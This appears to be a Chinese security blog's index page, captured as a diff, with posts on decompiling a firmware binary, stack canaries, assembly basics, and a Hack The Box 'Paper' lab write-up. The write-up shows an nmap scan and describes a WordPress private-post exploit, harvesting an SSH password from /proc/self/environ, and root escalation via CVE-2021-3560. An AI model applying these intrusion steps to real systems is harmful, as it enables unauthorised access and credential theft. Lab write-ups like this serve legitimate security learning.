+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300italic,400,400italic,700,700italic%7CFira+Code:300,300italic,400,400italic,700,700italic%7Cmonospace:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.11.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Stay Hungry, Stay Foolish.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="尘埃落定的空间站">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="尘埃落定的空间站">
+<meta property="og:description" content="Stay Hungry, Stay Foolish.">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="尘埃落定">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>尘埃落定的空间站</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">尘埃落定的空间站</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">尘埃落定</p>
+  <div class="site-description" itemprop="description">Stay Hungry, Stay Foolish.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/leothompson2" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;leothompson2" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://unsplash.com/@leothompson" title="Unsplash → https:&#x2F;&#x2F;unsplash.com&#x2F;@leothompson" rel="noopener" target="_blank"><i class="fab fa-unsplash fa-fw"></i>Unsplash</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/10/IAM%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/05/10/IAM%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">IAM命令注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-05-10 19:33:33 / 修改时间：22:29:14" itemprop="dateCreated datePublished" datetime="2022-05-10T19:33:33+08:00">2022-05-10</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>main()</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// [xsp+28h] [xbp+28h]</span></span><br><span class="line"></span><br><span class="line">  v3 = setUTCtx();                              <span class="comment">// v3为地址：41f480</span></span><br><span class="line">                                                <span class="comment">// 值为407798</span></span><br><span class="line">  initUT((__int64 (__fastcall ***)(_QWORD))v3); <span class="comment">// main-&gt;initUT(v3)-&gt;init_ip_group()-&gt;registerSG(byte_41F000);</span></span><br><span class="line">  init_ut_ctx_core_impl((__int64)v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ut_main_process((__int64)v3);               <span class="comment">// sub_407848,main进程执行该函数</span></span><br><span class="line">                                                <span class="comment">// v3 41ebb8</span></span><br><span class="line">    ut_channel_process();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>setUTCtx()</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 *<span class="title">setUTCtx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;qword_41F480, <span class="number">0</span>, <span class="string">&#x27;\x01P&#x27;</span>);</span><br><span class="line">  qword_41F480 = (__int64)off_41EBB8;</span><br><span class="line">  <span class="keyword">return</span> &amp;qword_41F480;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序启动时，有一个重要参数v3，这里需要跟进一下。v3是一个指针变量，存储指针，</p>
+<p>从setUTCtx()函数中可知，返回一个指针：</p>
+<p>地址：41F480</p>
+<p>值：sub_407798</p>
+<p>v3=41F480</p>
+<p>进入ut_main_process(v3)后，返回执行如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">ut_main_process</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + <span class="string">&#x27;\x10&#x27;</span>))(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里最终return执行</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + <span class="string">&#x27;\x10&#x27;</span>))(a1);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>如何找到sub_407848</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/%E6%97%A5%E5%B8%B8%E5%B0%8F%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/05/04/%E6%97%A5%E5%B8%B8%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">日常小记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-05-04 23:43:19" itemprop="dateCreated datePublished" datetime="2022-05-04T23:43:19+08:00">2022-05-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-11 17:29:12" itemprop="dateModified" datetime="2022-05-11T17:29:12+08:00">2022-05-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="2022-05-04"><a href="#2022-05-04" class="headerlink" title="2022/05/04"></a>2022/05/04</h2><p>今天是五四青年节，可惜已经居家快两个月，日渐烦躁。</p>
+<h2 id="2022-05-11"><a href="#2022-05-11" class="headerlink" title="2022/05/11"></a>2022/05/11</h2><p><strong>APKiD，apk信息收集工具</strong></p>
+<ul>
+<li>编译器指纹</li>
+<li>paker指纹</li>
+<li>…</li>
+</ul>
+<p><strong>Canary栈保护</strong></p>
+<p><a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/101754/0616/armclang-Reference/armclang-Command-line-Options/-fstack-protector---fstack-protector-all---fstack-protector-strong---fno-stack-protector#:~:text=%2Dfstack%2Dprotector%2Dall%20adds,of%20any%20size%20and%20type">https://developer.arm.com/documentation/101754/0616/armclang-Reference/armclang-Command-line-Options/-fstack-protector---fstack-protector-all---fstack-protector-strong---fno-stack-protector#:~:text=%2Dfstack%2Dprotector%2Dall%20adds,of%20any%20size%20and%20type</a>.</p>
+<p><code>-fstack-protector-all</code> adds stack protection to all functions regardless of their vulnerability.</p>
+<p><code>-fstack-protector-strong</code> enables stack protection for vulnerable functions that contain:</p>
+<ul>
+<li>An array of any size and type.</li>
+<li>A call to <code>alloca()</code>.</li>
+<li>A local variable that has its address taken.</li>
+</ul>
+<p><strong>FC_log</strong></p>
+<p>force close，强制关闭崩溃日志</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/29/HTB-Paper-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/29/HTB-Paper-Writeup/" class="post-title-link" itemprop="url">HTB Paper Writeup</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-29 20:53:58" itemprop="dateCreated datePublished" datetime="2022-04-29T20:53:58+08:00">2022-04-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-03 15:25:45" itemprop="dateModified" datetime="2022-05-03T15:25:45+08:00">2022-05-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>虽然做完了这个靶机，遗憾的是，录的视频被删除了，复盘不易。电脑硬盘太小了。总体来说，有几个知识点：</p>
+<ul>
+<li>X-Backend-Server</li>
+<li>/proc/self</li>
+<li>linpeas.sh</li>
+</ul>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>由于延迟影响，使用了clash进行了代理。如下启动后，可浏览器查看切换代理地址：<a target="_blank" rel="noopener" href="http://clash.razord.top/#/proxies">http://clash.razord.top/#/proxies</a></p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430163906744.png" alt="image-20220430163906744"></p>
+<p>在openvpn中配置代理</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430164112763.png" alt="image-20220430164112763"></p>
+<p>将ip：10.10.11.143添加到/etc/hosts文件中</p>
+<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong>，进行了全端口服务、脚本扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/Hacktb/paper]</span><br><span class="line">└─$ cat allPorts            </span><br><span class="line"><span class="comment"># Nmap 7.92 scan initiated Sat Apr 30 00:25:32 2022 as: nmap -sVC -p- -T4 -v -oN allPorts paper.htb</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> paper.htb (10.10.11.143)</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)</span><br><span class="line">|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)</span><br><span class="line">|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">|_http-generator: HTML Tidy <span class="keyword">for</span> HTML5 <span class="keyword">for</span> Linux version 5.7.28</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: HEAD GET POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: HEAD GET POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-generator: HTML Tidy <span class="keyword">for</span> HTML5 <span class="keyword">for</span> Linux version 5.7.28</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US</span><br><span class="line">| Subject Alternative Name: DNS:localhost.localdomain</span><br><span class="line">| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2021-07-03T08:52:34</span><br><span class="line">| Not valid after:  2022-07-08T10:32:34</span><br><span class="line">| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84</span><br><span class="line">|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sat Apr 30 00:36:02 2022 -- 1 IP address (1 host up) scanned in 630.26 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>总体看来只有三个端口，先访问了<strong>web端口</strong></p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430165153892.png" alt="image-20220430165153892"></p>
+<p>响应头中有<strong>X-Backend-Server</strong>字段，百度后如下。可能为后端端真实地址</p>
+<blockquote>
+<p>x-backend-server header is used to return the name of the back end webserver that may sit behind load balancer server</p>
+</blockquote>
+<p>访问该地址后，为一个wordpress网站，进行<strong>wpsan</strong>扫描后，没有找到漏洞</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430170149423.png" alt="image-20220430170149423"></p>
+<p>对于v5.2.3版本进行了搜索，查找相关exploit：<strong><a target="_blank" rel="noopener" href="https://wpscan.com/wordpress/523">https://wpscan.com/wordpress/523</a></strong> ，利用如下poc查看私人文章</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430170801376.png" alt="image-20220430170801376"></p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430171115890.png" alt="image-20220430171115890"></p>
+<p>进入后，注册登陆，发现了一个机器人并可以通过机器人命令查看、列举文件。在<strong>proc</strong>手册里可以看到如下</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430172605128.png" alt="image-20220430172605128"></p>
+<p>查看该目录，寻找重要信息</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430174828833.png" alt="image-20220430174828833"></p>
+<p>查看<strong>environ</strong>文件，其中有PASSWORD字段，尝试ssh登陆</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430174944622.png" alt="image-20220430174944622"></p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430175509773.png" alt="image-20220430175509773"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<strong>linpeas.sh</strong>扫描系统</p>
+<p><img src="/2022/04/29/HTB-Paper-Writeup/image-20220430180822525.png" alt="image-20220430180822525"></p>
+<p>最终通过<strong>CVE-2021-3560.py</strong>，提权至root</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">二进制分析入门（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-23 11:39:41" itemprop="dateCreated datePublished" datetime="2022-04-23T11:39:41+08:00">2022-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-03 15:22:30" itemprop="dateModified" datetime="2022-05-03T15:22:30+08:00">2022-05-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>学习内容主要来自于哔哩哔哩长亭科技，讲的真好。PS：有时间还是得补一下《程序员的自我修养》</p>
+<h2 id="二进制程序基础：编译、汇编、链接"><a href="#二进制程序基础：编译、汇编、链接" class="headerlink" title="二进制程序基础：编译、汇编、链接"></a><strong>二进制程序基础：编译、汇编、链接</strong></h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Af4y1U7cP?t=619.1">https://www.bilibili.com/video/BV1Af4y1U7cP?t=619.1</a></p>
+<h2 id="二进制程序基础：机器指令如何执行"><a href="#二进制程序基础：机器指令如何执行" class="headerlink" title="二进制程序基础：机器指令如何执行"></a><strong>二进制程序基础：机器指令如何执行</strong></h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1uf4y1U7g3?t=67.2">https://www.bilibili.com/video/BV1uf4y1U7g3?t=67.2</a></p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220423120201268.png" alt="image-20220423120201268"></p>
+<h2 id="二进制程序基础：栈"><a href="#二进制程序基础：栈" class="headerlink" title="二进制程序基础：栈"></a><strong>二进制程序基础：栈</strong></h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Yi4y1s7y8?t=32.8">https://www.bilibili.com/video/BV1Yi4y1s7y8?t=32.8</a></p>
+<p>栈</p>
+<ul>
+<li>先进后出数据结构</li>
+<li>局部内存管理<ul>
+<li>保存局部变量</li>
+<li>保存函数调用信息（返回地址…）</li>
+</ul>
+</li>
+<li>地址向低地址方向增长</li>
+<li>esp寄存器指向栈顶</li>
+<li>栈操作：入栈、出栈</li>
+</ul>
+<p> 常见指令：</p>
+<ul>
+<li>数据转移指令<ul>
+<li>mov</li>
+<li>push</li>
+<li>pop</li>
+<li>lea <code>load effective address</code> ：lea eax,[var]，将var存入寄存器eax，<strong>取地址</strong></li>
+</ul>
+</li>
+<li>算数与逻辑指令<ul>
+<li>add/sub</li>
+<li>inc/dec</li>
+<li>imul/idiv</li>
+<li>and/or/xor</li>
+<li>not/neg：not，按位取反；neg，按位取反+1</li>
+<li>shl/shr：移位指令</li>
+</ul>
+</li>
+<li>控制转移指令<ul>
+<li>jmp：无条件跳转</li>
+<li>j[condition]：条件跳转</li>
+<li>cmp：比较</li>
+<li>call/ret：调用/返回</li>
+</ul>
+</li>
+</ul>
+<p>寻址模式：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/3210621">https://baike.baidu.com/item/%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/3210621</a></p>
+<p>操作数寻址模式：</p>
+<ul>
+<li><strong>立即数</strong>寻址：指令地址字段为操作数本身（<strong>只能作为源操作数</strong>），例如：mov al,5</li>
+<li><strong>寄存器</strong>寻址：例如：mov ax,bx</li>
+<li>直接<strong>内存</strong>寻址：例如：mov ax,[2000h] 地址在[]中</li>
+<li>寄存器间接寻址：例如：mov eax,[ebx] 操作数的地址在寄存器中</li>
+<li>索引寻址：例如：mov ax,[di+100h] 基址寄存器内容+100h作为地址</li>
+<li>相对基址索引寻址：例如：mov dh,[bx+si+10h] 基址寄存器+变址寄存器+偏移量</li>
+<li>比列寻址变址：例如：mov eax,[ebx+4*ecx]</li>
+</ul>
+<p>Intel语法与AT&amp;T语法：</p>
+<p><img src="/2022/04/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20220423181227518.png" alt="image-20220423181227518"></p>
+<h2 id="二进制程序基础：调用约定"><a href="#二进制程序基础：调用约定" class="headerlink" title="二进制程序基础：调用约定"></a><strong>二进制程序基础：调用约定</strong></h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Xi4y147Sv?t=915.6">https://www.bilibili.com/video/BV1Xi4y147Sv?t=915.6</a></p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A">https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A</a></p>
+<p>调用约定？</p>
+<ul>
+<li>实现层面的规范</li>
+<li>约定了函数之间如何传递参数</li>
+<li>约定了函数如何传递返回值</li>
+</ul>
+<p>常见x86调用约定</p>
+<ul>
+<li>调用者负责清理栈上的参数<ul>
+<li>cdecl</li>
+<li>optlink</li>
+</ul>
+</li>
+<li>被调用者负责清理栈上的参数<ul>
+<li>stdcall</li>
+<li>fastcall</li>
+</ul>
+</li>
+</ul>
+<p>几个重点：</p>
+<ul>
+<li>栈帧</li>
+<li>内存对齐</li>
+<li>ebp：栈基 esp：栈顶</li>
+</ul>
